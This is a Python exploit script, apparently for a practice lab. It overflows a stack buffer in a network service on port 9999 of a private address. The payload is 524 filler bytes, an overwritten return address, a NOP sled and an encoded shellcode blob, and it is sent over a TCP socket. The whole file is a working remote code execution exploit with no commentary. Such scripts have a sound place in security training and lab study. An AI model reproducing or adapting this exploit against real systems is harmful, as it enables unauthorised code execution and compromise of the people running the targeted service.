#!/usr/bin/python

import socket
import sys

ip = '10.10.210.252'
port = 9999

buffer = 'A'*524
buffer += '\xf3\x12\x17\x31' #0x311712f3
buffer += '\x90' * 16


buf =  b""
buf += b"\xbb\xb4\xb5\xd8\x4f\xd9\xcd\xd9\x74\x24\xf4\x58\x2b"
buf += b"\xc9\xb1\x12\x31\x58\x12\x03\x58\x12\x83\x74\xb1\x3a"
buf += b"\xba\x45\x61\x4d\xa6\xf6\xd6\xe1\x43\xfa\x51\xe4\x24"
buf += b"\x9c\xac\x67\xd7\x39\x9f\x57\x15\x39\x96\xde\x5c\x51"
buf += b"\x23\x29\x9e\x1a\x5b\x2b\xa0\x4d\x5d\xa2\x41\xdd\x3b"
buf += b"\xe5\xd0\x4e\x77\x06\x5a\x91\xba\x89\x0e\x39\x2b\xa5"
buf += b"\xdd\xd1\xdb\x96\x0e\x43\x75\x60\xb3\xd1\xd6\xfb\xd5"
buf += b"\x65\xd3\x36\x95"


try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        data = bytes(buffer, 'latin-1')
        s.settimeout(5)
        s.connect((ip, port))
        s.recv(1024)
        print('Sending buffer')
        s.send(data + buf)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
